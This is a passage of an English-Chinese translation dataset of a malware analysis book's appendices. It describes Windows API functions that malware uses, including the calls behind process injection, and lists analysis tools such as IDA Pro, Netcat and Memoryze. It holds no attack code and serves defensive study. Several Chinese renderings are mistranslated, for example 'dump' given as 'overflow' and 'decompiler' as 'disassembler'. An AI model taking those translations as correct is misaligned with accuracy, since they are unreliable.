    sometimes uses VirtualAllocEx as part of process injection.
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 一种可以在远程进程中分配内存的内存分配例程。恶意软件有时会将VirtualAllocEx作为进程注入的一部分使用。
- en: '**VirtualProtectEx**'
  id: totrans-445
  prefs: []
  type: TYPE_NORMAL
  zh: '**VirtualProtectEx**'
- en: Changes the protection on a region of memory. Malware may use this function
    to change a read-only section of memory to an executable.
  id: totrans-446
  prefs: []
  type: TYPE_NORMAL
  zh: 改变内存区域的保护。恶意软件可能使用此函数将只读内存部分更改为可执行。
- en: '**WideCharToMultiByte**'
  id: totrans-447
  prefs: []
  type: TYPE_NORMAL
  zh: '**WideCharToMultiByte**'
- en: Used to convert a Unicode string into an ASCII string.
  id: totrans-448
  prefs: []
  type: TYPE_NORMAL
  zh: 用于将Unicode字符串转换为ASCII字符串。
- en: '**WinExec**'
  id: totrans-449
  prefs: []
  type: TYPE_NORMAL
  zh: '**WinExec**'
- en: Used to execute another program. If malware creates a new process, you will
    need to analyze the new process as well.
  id: totrans-450
  prefs: []
  type: TYPE_NORMAL
  zh: 用于执行另一个程序。如果恶意软件创建了一个新进程，您还需要分析该新进程。
- en: '**462**'
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
  zh: '**462**'
- en: Appendix A
  id: totrans-452
  prefs: []
  type: TYPE_NORMAL
  zh: 附录A
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-453
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**WlxLoggedOnSAS (and other Wlx* functions)** A function that must be exported
    by DLLs that will act as authentication modules. Malware that exports many Wlx*
    functions might be performing Graphical Identification and Authentication (GINA)
    replacement, as discussed in Chapter 11\.'
  id: totrans-454
  prefs: []
  type: TYPE_NORMAL
  zh: '**WlxLoggedOnSAS（以及其他Wlx*函数）** 一个必须由作为身份验证模块操作的DLL导出的函数。恶意软件导出许多Wlx*函数可能正在执行图形识别和身份验证（GINA）替换，如第11章所述。'
- en: '**Wow64DisableWow64FsRedirection**'
  id: totrans-455
  prefs: []
  type: TYPE_NORMAL
  zh: '**Wow64DisableWow64FsRedirection**'
- en: Disables file redirection that occurs in 32-bit files loaded on a 64-bit system.
    If a 32-bit application writes to *C:\Windows\System32* after calling this function,
    then it will write to the real *C:\Windows\System32* instead of being redirected
    to *C:\Windows\SysWOW64*.
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
  zh: 禁用在64位系统上加载的32位文件中发生的文件重定向。如果32位应用程序在调用此函数后写入*C:\Windows\System32*，则它将写入实际的*C:\Windows\System32*而不是被重定向到*C:\Windows\SysWOW64*。
- en: '**WriteProcessMemory**'
  id: totrans-457
  prefs: []
  type: TYPE_NORMAL
  zh: '**WriteProcessMemory**'
- en: Used to write data to a remote process. Malware uses WriteProcessMemory as part
    of process injection.
  id: totrans-458
  prefs: []
  type: TYPE_NORMAL
  zh: 用于向远程进程写入数据。恶意软件使用WriteProcessMemory作为进程注入的一部分。
- en: '**WSAStartup**'
  id: totrans-459
  prefs: []
  type: TYPE_NORMAL
  zh: '**WSAStartup**'
- en: Used to initialize low-level network functionality. Finding calls to WSAStartup
    can often be an easy way to locate the start of network-related functionality.
  id: totrans-460
  prefs: []
  type: TYPE_NORMAL
  zh: 用于初始化低级网络功能。找到对WSAStartup的调用通常可以轻松定位网络相关功能的开始。
- en: Important Windows Functions
  id: totrans-461
  prefs: []
  type: TYPE_NORMAL
  zh: 重要Windows函数
- en: '**463**'
  id: totrans-462
  prefs: []
  type: TYPE_NORMAL
  zh: '**463**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-463
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-464
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**T O O L S F O R M A L W A R E A N A L Y S I S**'
  id: totrans-465
  prefs: []
  type: TYPE_NORMAL
  zh: '**T O O L S F O R M A L W A R E A N A L Y S I S**'
- en: This appendix lists popular malware analysis tools,
  id: totrans-466
  prefs: []
  type: TYPE_NORMAL
  zh: 本附录列出了流行的恶意软件分析工具，
- en: including tools discussed in the book and others that
  id: totrans-467
  prefs: []
  type: TYPE_NORMAL
  zh: 包括书中讨论的工具和其他工具
- en: we did not cover. We have made this list somewhat
  id: totrans-468
  prefs: []
  type: TYPE_NORMAL
  zh: 我们没有涵盖。我们已将此列表整理得
- en: comprehensive so that you can try a variety of tools
  id: totrans-469
  prefs: []
  type: TYPE_NORMAL
  zh: 全面，以便您可以尝试各种工具
- en: and figure out which ones best suit your needs.
  id: totrans-470
  prefs: []
  type: TYPE_NORMAL
  zh: 并找出哪些最适合您的需求。
- en: '**ApateDNS**'
  id: totrans-471
  prefs: []
  type: TYPE_NORMAL
  zh: '**ApateDNS**'
- en: ApateDNS is a tool for controlling DNS responses. Its interface is an easy-to-use
    GUI. As a phony DNS server, ApateDNS spoofs DNS responses to a user-specified
    IP address by listening on UDP port 53 on the local machine. ApateDNS also automatically
    configures the local DNS server to localhost. When you exit ApateDNS, it restores
    the original local DNS
  id: totrans-472
  prefs: []
  type: TYPE_NORMAL
  zh: ApateDNS 是一个用于控制 DNS 响应的工具。其界面是一个易于使用的图形用户界面。作为一个虚假的 DNS 服务器，ApateDNS 通过在本地机器上监听
    UDP 端口 53 来欺骗用户指定的 IP 地址的 DNS 响应。ApateDNS 还会自动配置本地 DNS 服务器为 localhost。当您退出 ApateDNS
    时，它会恢复原始的本地 DNS 设置
- en: settings. Use ApateDNS during dynamic analysis, as described in Chapter 3\.
  id: totrans-473
  prefs: []
  type: TYPE_NORMAL
  zh: 设置。在第三章中描述的动态分析期间使用 ApateDNS。
- en: You can download ApateDNS for free from *http://www.mandiant.com/*.
  id: totrans-474
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以从 *http://www.mandiant.com/* 免费下载 ApateDNS。
- en: '**Autoruns**'
  id: totrans-475
  prefs: []
  type: TYPE_NORMAL
  zh: '**Autoruns**'
- en: Autoruns is a utility with a long list of autostarting locations for Windows.
  id: totrans-476
  prefs: []
  type: TYPE_NORMAL
  zh: Autoruns 是一个具有大量 Windows 自动启动位置的实用程序。
- en: For persistence, malware often installs itself in a variety of locations, including
    the registry, startup folder, and so on. Autoruns searches
  id: totrans-477
  prefs: []
  type: TYPE_NORMAL
  zh: 为了持久性，恶意软件通常会在各种位置安装自己，包括注册表、启动文件夹等。Autoruns 会搜索
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-478
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 92](index-499_1.png)'
  id: totrans-479
  prefs: []
  type: TYPE_IMG
  zh: '![Image 92](index-499_1.png)'
- en: various possible locations and reports to you in a GUI. Use Autoruns for dynamic
    analysis to see where malware installed itself. You can download Autoruns as part
    of the Sysinternals Suite of tools from *http://*
  id: totrans-480
  prefs: []
  type: TYPE_NORMAL
  zh: 各种可能的位置，并以图形用户界面向您报告。使用 Autoruns 进行动态分析以查看恶意软件安装的位置。您可以从 *http://* 下载 Autoruns
    作为 Sysinternals 工具套件的一部分。
- en: '*www.sysinternals.com/*.'
  id: totrans-481
  prefs: []
  type: TYPE_NORMAL
  zh: '*www.sysinternals.com/*.'
- en: '**BinDiff**'
  id: totrans-482
  prefs: []
  type: TYPE_NORMAL
  zh: '**BinDiff**'
- en: BinDiff is a powerful binary comparison plug-in for IDA Pro that allows you
    to quickly compare malware variants. BinDiff lets you pinpoint new functions in
    a given malware variant and tells you if any functions are similar or missing.
    If the functions are similar, BinDiff indicates how similar they are and compares
    the two, as shown in Figure B-1\.
  id: totrans-483
  prefs: []
  type: TYPE_NORMAL
  zh: BinDiff 是 IDA Pro 的一个强大的二进制比较插件，允许您快速比较恶意软件变体。BinDiff 允许您在给定的恶意软件变体中定位新功能，并告诉您是否有任何功能相似或缺失。如果功能相似，BinDiff
    会指示它们有多相似，并比较这两个功能，如图 B-1 所示。
- en: '*Figure B-1: BinDiff difference comparison showing code missing from the variant’s
    function* As you can see in Figure B-1, the left side of the graph is missing
    two boxes that appear in the right side. You can zoom in and examine the missing
    instructions. BinDiff will also guess at how similar the overall binary is to
    one that you are comparing, though you must generate an IDB file for both the
    original and the variant malware for this to work.'
  id: totrans-484
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 B-1：BinDiff 差异比较显示变体功能中缺失的代码* 如图 B-1 所见，图表的左侧缺失了右侧出现的两个框。您可以放大并检查缺失的指令。BinDiff
    还会猜测整体二进制与您正在比较的二进制之间的相似程度，尽管您必须为原始和变体恶意软件生成 IDB 文件才能使此功能生效。'
- en: (If you have a fully labeled IDB file for the comparison, you will be able to
    more easily recognize what is actually similar in the binary.) BinDiff is available
    for purchase from *http://www.zynamics.com/*.
  id: totrans-485
  prefs: []
  type: TYPE_NORMAL
  zh: （如果您有用于比较的完整标记 IDB 文件，您将能够更容易地识别二进制中实际相似的内容。）BinDiff 可从 *http://www.zynamics.com/*
    购买。
- en: '**BinNavi**'
  id: totrans-486
  prefs: []
  type: TYPE_NORMAL
  zh: '**BinNavi**'
- en: BinNavi is a reverse-engineering environment similar to IDA Pro. Its strength
    lies in its graphical approach to reverse-engineering code. And, unlike IDA Pro,
    BinNavi can centrally manage your previously analyzed databases, which helps to
    track information; team members can easily work on the same project and share
    information and findings. BinNavi is available for purchase from *http://www.zynamics.com/*.
  id: totrans-487
  prefs: []
  type: TYPE_NORMAL
  zh: BinNavi 是一个类似于 IDA Pro 的逆向工程环境。其优势在于其图形化的逆向工程代码方法。而且，与 IDA Pro 不同，BinNavi 可以集中管理您之前分析过的数据库，这有助于跟踪信息；团队成员可以轻松地在一个项目上工作并共享信息和发现。BinNavi
    可从 *http://www.zynamics.com/* 购买。
- en: '**466**'
  id: totrans-488
  prefs: []
  type: TYPE_NORMAL
  zh: '**466**'
- en: Appendix B
  id: totrans-489
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 B
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-490
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Bochs**'
  id: totrans-491
  prefs: []
  type: TYPE_NORMAL
  zh: '**Bochs**'
- en: Bochs is an open source debugger that simulates a complete x86 computer. Bochs
    is most useful when you want to debug a short code snippet in IDA Pro. IDA Pro
    supports a direct debugging mode of the IDB file using Bochs. When debugging in
    this mode, the input file format isn’t important—it can be a DLL, shellcode dump,
    or any other database that contains x86 code. You can simply point to the code
    snippet and start debugging. This approach is often useful when dealing with encoded
    strings or configuration data. You can download Bochs for free from *http://bochs.sourceforge.net/*.
    A tutorial on installing and using Bochs in IDA Pro can be found at *http://www.hex-rays.com/products/ida/debugger/*
  id: totrans-492
  prefs: []
  type: TYPE_NORMAL
  zh: Bochs 是一个开源的调试器，可以模拟完整的 x86 计算机。当您想在 IDA Pro 中调试一小段代码时，Bochs 非常有用。IDA Pro 支持使用
    Bochs 直接调试 IDB 文件。在这种模式下调试时，输入文件格式并不重要——它可以是一个 DLL、shellcode 溢出，或者任何包含 x86 代码的其他数据库。您只需指向代码片段即可开始调试。这种方法在处理编码字符串或配置数据时通常很有用。您可以从
    *http://bochs.sourceforge.net/* 免费下载 Bochs。关于在 IDA Pro 中安装和使用 Bochs 的教程可以在 *http://www.hex-rays.com/products/ida/debugger/*
    找到。
- en: '*bochs_tut.pdf.*'
  id: totrans-493
  prefs: []
  type: TYPE_NORMAL
  zh: '*bochs_tut.pdf.*'
- en: '**Burp Suite**'
  id: totrans-494
  prefs: []
  type: TYPE_NORMAL
  zh: '**Burp Suite**'
- en: The Burp Suite is typically used for testing web applications. It can be configured
    to allow malware analysts to trap specific server requests and responses in order
    to manipulate what is being delivered to a system.
  id: totrans-495
  prefs: []
  type: TYPE_NORMAL
  zh: Burp Suite 通常用于测试 Web 应用程序。它可以配置为允许恶意软件分析师捕获特定的服务器请求和响应，以便操纵发送到系统的内容。
- en: When Burp is set up as a man-in-the-middle, you can modify HTTP or HTTPS requests
    by changing the headers, data, and parameters sent by the malware to a remote
    server in order to force the server to give you additional information. You can
    download the Burp Suite from *http://*
  id: totrans-496
  prefs: []
  type: TYPE_NORMAL
  zh: 当 Burp 设置为中间人时，您可以通过更改由恶意软件发送到远程服务器的头信息、数据和参数来修改 HTTP 或 HTTPS 请求，以迫使服务器提供更多信息。您可以从
    *http://* 下载 Burp Suite。
- en: '*portswigger.net/burp/*.'
  id: totrans-497
  prefs: []
  type: TYPE_NORMAL
  zh: '*portswigger.net/burp/*.'
- en: '**Capture BAT**'
  id: totrans-498
  prefs: []
  type: TYPE_NORMAL
  zh: '**Capture BAT**'
- en: Capture BAT is a dynamic analysis tool used to monitor malware as it is running.
    Capture BAT will monitor the filesystem, registry, and process activity. You can
    use exclusion lists (including many preset ones) to remove the noise in order
    to focus on the malware you are analyzing.
  id: totrans-499
  prefs: []
  type: TYPE_NORMAL
  zh: Capture BAT 是一个动态分析工具，用于在恶意软件运行时对其进行监控。Capture BAT 将监控文件系统、注册表和进程活动。您可以使用排除列表（包括许多预设的列表）来消除噪音，以便专注于您正在分析的恶意软件。
- en: While Capture BAT doesn’t have an extensive GUI like Process Monitor, it’s open
    source, so you can modify it. You can download Capture BAT
  id: totrans-500
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然 Capture BAT 没有像 Process Monitor 那样的丰富 GUI，但它开源，因此您可以修改它。您可以从下载 Capture BAT
- en: for free from *http://www.honeynet.org/*.
  id: totrans-501
  prefs: []
  type: TYPE_NORMAL
  zh: 免费从 *http://www.honeynet.org/* 下载。
- en: '**CFF Explorer**'
  id: totrans-502
  prefs: []
  type: TYPE_NORMAL
  zh: '**CFF Explorer**'
- en: CFF Explorer is a tool designed to make PE editing easy. The tool is useful
    for editing resource sections, adding imports, or scanning for signatures. CFF
    Explorer supports x86 and x64 systems, and it can handle
  id: totrans-503
  prefs: []
  type: TYPE_NORMAL
  zh: CFF Explorer 是一个旨在使 PE 编辑变得简单的工具。该工具对于编辑资源部分、添加导入或扫描签名很有用。CFF Explorer 支持 x86
    和 x64 系统，并且可以处理
- en: .NET files without having the .NET Framework installed. You can download CFF
    Explorer for free from *http://www.ntcore.com/*.
  id: totrans-504
  prefs: []
  type: TYPE_NORMAL
  zh: 即使没有安装 .NET Framework，也可以使用 .NET 文件。您可以从 *http://www.ntcore.com/* 免费下载 CFF Explorer。
- en: '**Deep Freeze**'
  id: totrans-505
  prefs: []
  type: TYPE_NORMAL
  zh: '**Deep Freeze**'
- en: Deep Freeze from Faronics is a useful tool to use when performing malware analysis
    on physical hardware. It provides a VMware snapshotting capability for real hardware.
    You can run your malware, analyze it, and then just reboot. All the damage done
    by the malware will be undone, and your system will be back to a clean state.
    Deep Freeze is available for purchase from *http://www.faronics.com/*.
  id: totrans-506
  prefs: []
  type: TYPE_NORMAL
  zh: Faronics 的 Deep Freeze 是在物理硬件上执行病毒分析时非常有用的工具。它为真实硬件提供了 VMware 快照功能。您可以运行恶意软件，分析它，然后只需重新启动。恶意软件造成的所有损害都将被撤销，您的系统将恢复到干净的状态。Deep
    Freeze 可从 *http://www.faronics.com/* 购买。
- en: Tools for Malware Analysis
  id: totrans-507
  prefs: []
  type: TYPE_NORMAL
  zh: 病毒分析工具
- en: '**467**'
  id: totrans-508
  prefs: []
  type: TYPE_NORMAL
  zh: '**467**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-509
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 93](index-501_1.png)'
  id: totrans-510
  prefs: []
  type: TYPE_IMG
  zh: '![Image 93](index-501_1.png)'
- en: '**Dependency Walker**'
  id: totrans-511
  prefs: []
  type: TYPE_NORMAL
  zh: '**依赖关系分析器**'
- en: Dependency Walker is a static analysis tool used to explore DLLs and functions
    imported by a piece of malware. It works on both x86 and x64
  id: totrans-512
  prefs: []
  type: TYPE_NORMAL
  zh: 依赖关系分析器是一个静态分析工具，用于探索恶意软件导入的 DLL 和函数。它适用于 x86 和 x64 架构。
- en: binaries, and builds a hierarchical tree diagram of all DLLs that will be loaded
    into memory when the malware is run. We discuss Dependency Walker in Chapter 1\.
    You can download it for free from *http://www*
  id: totrans-513
  prefs: []
  type: TYPE_NORMAL
  zh: 二进制文件，并在恶意软件运行时构建所有将加载到内存中的 DLL 的分层树状图。我们在第 1 章中讨论了依赖关系分析器。您可以从 *http://www*
    免费下载它。
- en: '*.dependencywalker.com/*.'
  id: totrans-514
  prefs: []
  type: TYPE_NORMAL
  zh: '*.dependencywalker.com/*.'
- en: '**Hex Editors**'
  id: totrans-515
  prefs: []
  type: TYPE_NORMAL
  zh: '**Hex Editors**'
- en: Hex editors allow you to edit and view files containing binary data. Many hex
    editors are available, such as WinHex (our choice in this book), Hex Workshop,
    010 Editor, HexEdit, Hex Editor Neo, FileInsight, and FlexHEX. When choosing a
    hex editor, look for features like a solid GUI, binary comparison, many data-decoding
    options (such as multibyte XOR), a built-in hash calculator, file format parsing,
    pattern searching, and so on. Many of these tools are available for purchase,
    but most come with a trial version.
  id: totrans-516
  prefs: []
  type: TYPE_NORMAL
  zh: Hex 编辑器允许你编辑和查看包含二进制数据的文件。有许多 hex 编辑器可供选择，例如 WinHex（本书中的选择）、Hex Workshop、010
    Editor、HexEdit、Hex Editor Neo、FileInsight 和 FlexHEX。在选择 hex 编辑器时，寻找具有坚固的 GUI、二进制比较、许多数据解码选项（如多字节
    XOR）、内置哈希计算器、文件格式解析、模式搜索等功能。许多这些工具都可以购买，但大多数都提供试用版。
- en: '**Hex-Rays Decompiler**'
  id: totrans-517
  prefs: []
  type: TYPE_NORMAL
  zh: '**Hex-Rays Decompiler**'
- en: The Hex-Rays Decompiler is a powerful, but expensive, plug-in for IDA Pro that
    attempts to convert assembly code into human-readable, C-like pseudocode text.
    This tool installs an F5 “cheat button.” When you are looking at disassembly in
    IDA Pro, press F5 to have the plug-in open a new window with the C code. Figure
    B-2 shows what the pseudocode looks like for a code snippet from a piece of malware.
  id: totrans-518
  prefs: []
  type: TYPE_NORMAL
  zh: Hex-Rays Decompiler 是 IDA Pro 的一个强大但昂贵的插件，它试图将汇编代码转换为人类可读的、类似 C 语言的伪代码文本。此工具安装了一个
    F5 “快捷按钮”。当你正在 IDA Pro 中查看反汇编代码时，按 F5 可以让插件打开一个新窗口，显示 C 代码。图 B-2 展示了来自恶意软件代码片段的伪代码外观。
- en: '*Figure B-2: Hex-Rays Decompiler showing C-like pseudocode generated from assembly*
    In the example in Figure B-2, the Hex-Rays Decompiler turned more than 100 assembly
    instructions into just eight lines of C code. Notice that the plug-in will use
    your renamed variable names from IDA Pro. In this example, you can easily see
    the parameters that are passed to a function, and nested if statements are more
    obvious.'
  id: totrans-519
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 B-2：Hex-Rays Decompiler 显示从汇编代码生成的类似 C 语言的伪代码* 在图 B-2 的示例中，Hex-Rays Decompiler
    将超过 100 条汇编指令转换成了八行 C 代码。请注意，插件将使用你在 IDA Pro 中重命名的变量名。在这个例子中，你可以轻松地看到传递给函数的参数，嵌套的
    if 语句也更加明显。'
- en: We find this plug-in particularly useful when trying to decipher difficult encoding
    routines. In some cases, you can even copy and paste the decompiler’s output and
    use it to write a decoding tool. Hex-Rays Decompiler is the best tool on the market
    for decompiling, but it’s not without its flaws. The Hex-Rays Decompiler is available
    for purchase from *http://www.hex-rays.com/*.
  id: totrans-520
  prefs: []
  type: TYPE_NORMAL
  zh: 我们发现这个插件在尝试解码困难的编码程序时特别有用。在某些情况下，你甚至可以复制粘贴反汇编器的输出，并使用它来编写解码工具。Hex-Rays Decompiler
    是市场上最好的反汇编工具，但它并非没有缺陷。Hex-Rays Decompiler 可从 *http://www.hex-rays.com/* 购买。
- en: '**468**'
  id: totrans-521
  prefs: []
  type: TYPE_NORMAL
  zh: '**468**'
- en: Appendix B
  id: totrans-522
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 B
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-523
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**IDA Pro**'
  id: totrans-524
  prefs: []
  type: TYPE_NORMAL
  zh: '**IDA Pro**'
- en: IDA Pro is the most widely used disassembler for malware analysis. We discuss
    IDA Pro extensively throughout the book, and Chapter 5 provides an in-depth introduction
    to the tool. We recommend the commercial version from *http://www.hex-rays.com/*.
    A freeware version is available from *http://www.hex-rays.com/products/ida/support/download_freeware.shtml*.
  id: totrans-525
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro 是最广泛使用的恶意软件分析反汇编器。我们在整本书中详细讨论了 IDA Pro，第 5 章提供了对该工具的深入介绍。我们推荐商业版本，请访问
    *http://www.hex-rays.com/*。免费版本可在 *http://www.hex-rays.com/products/ida/support/download_freeware.shtml*
    获取。
- en: '**Immunity Debugger**'
  id: totrans-526
  prefs: []
  type: TYPE_NORMAL
  zh: '**Immunity Debugger**'
- en: Immunity Debugger (ImmDbg) is a freely available user-mode debugger. It is derived
    from the OllyDbg 1.1 source code, as we discuss in Chapter 9, except that ImmDbg
    has cosmetically modified the OllyDbg GUI and added a fully functional Python
    interpreter with an API. In
  id: totrans-527
  prefs: []
  type: TYPE_NORMAL
  zh: Immunity Debugger（ImmDbg）是一个免费的用户模式调试器。它源自 OllyDbg 1.1 源代码，正如我们在第 9 章中讨论的那样，除了
    ImmDbg 对 OllyDbg GUI 进行了外观上的修改，并添加了一个完全功能的 Python 解释器和 API。在
- en: “Scriptable Debugging” on page 200 and the Chapter 13 labs, we demonstrate how
    to use ImmDbg’s Python scripting ability. You can download ImmDbg from *http://www.immunityinc.com/*.
  id: totrans-528
  prefs: []
  type: TYPE_NORMAL
  zh: 在第 200 页的“可脚本调试”和第 13 章的实验室中，我们展示了如何使用 ImmDbg 的 Python 脚本能力。您可以从 *http://www.immunityinc.com/*
    下载 ImmDbg。
- en: '**Import REConstructor**'
  id: totrans-529
  prefs: []
  type: TYPE_NORMAL
  zh: '**Import REConstructor**'
- en: Import REConstructor (ImpREC) is a useful tool when you are manually unpacking
    a piece of malware. The import address table (IAT) is often damaged when you dump
    memory while unpacking, and you can use ImpREC to repair the table. You provide
    the malware running in memory and a dumped version on disk, and ImpREC does its
    best to repair the binary. You can download ImpREC for free from *http://tuts4you.com/*
  id: totrans-530
  prefs: []
  type: TYPE_NORMAL
  zh: 当你手动解包恶意软件时，Import REConstructor (ImpREC) 是一个有用的工具。在解包过程中转储内存时，导入地址表 (IAT) 通常会被损坏，你可以使用
    ImpREC 来修复该表。你需要提供运行在内存中的恶意软件和一个在磁盘上的转储版本，ImpREC 会尽力修复二进制文件。你可以免费从 *http://tuts4you.com/*
    下载 ImpREC。
- en: '*download.php?view.415\.*'
  id: totrans-531
  prefs: []
  type: TYPE_NORMAL
  zh: '*download.php?view.415\.*'
- en: '**INetSim**'
  id: totrans-532
  prefs: []
  type: TYPE_NORMAL
  zh: '**INetSim**'
- en: INetSim is a Linux-based software suite for simulating common network services
    that we find useful for dynamic analysis. Be sure to install it on a Linux virtual
    machine, and set it up on the same virtual network as your malware analysis Windows
    VM. INetSim can emulate many popular services, such as a Microsoft Internet Information
    Services (IIS) web server, and can even listen on all ports for incoming connections.
    We discuss INetSim in Chapter 3\. You can download it for free from *http://www*
  id: totrans-533
  prefs: []
  type: TYPE_NORMAL
  zh: INetSim 是一个基于 Linux 的软件套件，用于模拟我们用于动态分析的一些常见网络服务。请确保在 Linux 虚拟机上安装它，并在与你的恶意软件分析
    Windows VM 相同的虚拟网络上设置它。INetSim 可以模拟许多流行的服务，例如微软的 Internet Information Services
    (IIS) 网络服务器，甚至可以监听所有端口以接收传入的连接。我们在第 3 章中讨论了 INetSim。你可以免费从 *http://www* 下载它。
- en: '*.inetsim.org/*.'
  id: totrans-534
  prefs: []
  type: TYPE_NORMAL
  zh: '*.inetsim.org/*.'
- en: '**LordPE**'
  id: totrans-535
  prefs: []
  type: TYPE_NORMAL
  zh: '**LordPE**'
- en: LordPE is a free tool for dumping an executable from memory. It allows PE editing
    and can be used to repair a program you dumped from memory using another method.
    LordPE is most commonly used for unpacking malware. You can download it for free
    from *http://www.woodmann*
  id: totrans-536
  prefs: []
  type: TYPE_NORMAL
  zh: LordPE 是一个从内存中转储可执行文件的免费工具。它允许 PE 编辑，并且可以用来修复使用其他方法从内存中转储的程序。LordPE 最常用于解包恶意软件。你可以免费从
    *http://www.woodmann* 下载它。
- en: '*.com/collaborative/tools/index.php/LordPE.*'
  id: totrans-537
  prefs: []
  type: TYPE_NORMAL
  zh: '*.com/collaborative/tools/index.php/LordPE.*'
- en: '**Malcode Analyst Pack**'
  id: totrans-538
  prefs: []
  type: TYPE_NORMAL
  zh: '**恶意代码分析包**'
- en: The Malcode Analyst Pack contains a series of utilities, one of which installs
    useful Windows shell extensions for strings, an MD5 hash calculator, and a CHM
    decompile option. The CHM decompile option is handy when dealing with malicious
    Windows help files. Also included is FakeDNS, a useful tool for spoofing DNS responses
    to a user-specified Tools for Malware Analysis
  id: totrans-539
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意代码分析包包含一系列实用工具，其中之一安装了有用的 Windows 壳扩展，用于字符串、MD5 哈希计算器以及 CHM 反编译选项。当处理恶意的 Windows
    帮助文件时，CHM 反编译选项非常有用。还包括 FakeDNS，这是一个用于欺骗用户指定 DNS 响应的有用工具。还包括用于恶意软件分析的工具。
- en: '**469**'
  id: totrans-540
  prefs: []
  type: TYPE_NORMAL
  zh: '**469**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-541
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: address. While these utilities are no longer officially supported, you might
    still be able to download them from *http://labs.idefense.com/*
  id: totrans-542
  prefs: []
  type: TYPE_NORMAL
  zh: 地址。虽然这些实用工具不再官方支持，但你可能仍然可以从 *http://labs.idefense.com/* 下载它们。
- en: '*software/download/?downloadID=8\.*'
  id: totrans-543
  prefs: []
  type: TYPE_NORMAL
  zh: '*software/download/?downloadID=8\.*'
- en: '**Memoryze**'
  id: totrans-544
  prefs: []
  type: TYPE_NORMAL
  zh: '**Memoryze**'
- en: Memoryze is a free memory forensic tool that enables you to dump and analyze
    live memory. You can use Memoryze to acquire all of live memory or just individual
    processes, as well as to identify all modules loaded on a given system, including
    drivers and kernel-level executables. Memoryze also can detect rootkits and the
    hooks they install. If you choose to use Memoryze, be sure to download Audit Viewer,
    a tool for visualizing Memoryze’s output that makes the memory analysis process
    quicker and more intuitive. Audit Viewer includes a malware rating index to help
    you identify suspicious content in your memory dumps. You can download Memoryze
    and Audit Viewer for free from *http://www.mandiant.com/*.
  id: totrans-545
  prefs: []
  type: TYPE_NORMAL
  zh: Memoryze 是一个免费的内存取证工具，它允许你转储和分析实时内存。你可以使用 Memoryze 获取所有实时内存或仅个别进程，以及识别给定系统上加载的所有模块，包括驱动程序和内核级可执行文件。Memoryze
    还可以检测 rootkits 和它们安装的钩子。如果你选择使用 Memoryze，请确保下载 Audit Viewer，这是一个可视化 Memoryze 输出的工具，可以使内存分析过程更快、更直观。Audit
    Viewer 包括一个恶意软件评分索引，可以帮助你识别内存转储中的可疑内容。你可以免费从 *http://www.mandiant.com/* 下载 Memoryze
    和 Audit Viewer。
- en: '**Netcat**'
  id: totrans-546
  prefs: []
  type: TYPE_NORMAL
  zh: '**Netcat**'
- en: Netcat, known as the “TCP/IP Swiss Army knife,” can be used to monitor or start
    inbound and outbound connections. Netcat is most useful during dynamic analysis
    for listening on ports that you know the malware connects to, because Netcat prints
    all the data it receives to the screen via standard output. We cover Netcat usage
    for dynamic analysis in Chapter 3 and also talk about how attackers use it in
    Chapter 11\. Netcat is installed by default in Cygwin and on most Linux distributions.
    You can download the Windows version for free from *http://joncraton.org/media/*
  id: totrans-547
  prefs: []
  type: TYPE_NORMAL
  zh: Netcat，被称为“TCP/IP瑞士军刀”，可以用来监控或启动入站和出站连接。Netcat 在动态分析中非常有用，因为它可以监听已知恶意软件连接到的端口，因为
    Netcat 会将接收到的所有数据通过标准输出打印到屏幕上。我们在第 3 章中介绍了 Netcat 的动态分析用法，并在第 11 章中讨论了攻击者如何使用它。Netcat
    默认安装在 Cygwin 和大多数 Linux 发行版中。您可以从 *http://joncraton.org/media/* 免费下载 Windows 版本。
- en: '*files/nc111nt.zip.*'
  id: totrans-548
  prefs: []
  type: TYPE_NORMAL
  zh: '*files/nc111nt.zip.*'
- en: '**OfficeMalScanner**'
  id: totrans-549
  prefs: []
  type: TYPE_NORMAL
  zh: '**OfficeMalScanner**'
- en: OfficeMalScanner is a free command-line tool for finding malicious code in Microsoft
    Office documents. It locates shellcode, embedded PE
  id: totrans-550
  prefs: []
  type: TYPE_NORMAL
  zh: OfficeMalScanner 是一款用于在 Microsoft Office 文档中查找恶意代码的免费命令行工具。它定位壳代码、嵌入的 PE
- en: files, and OLE streams in Excel, Word, and PowerPoint documents, and can decompress
    the newer format of Microsoft Office documents. We recommend running OfficeMalScanner
    with the scan and brute options on pre–Office 2007 documents and with the inflate
    option on post–
  id: totrans-551
  prefs: []
  type: TYPE_NORMAL
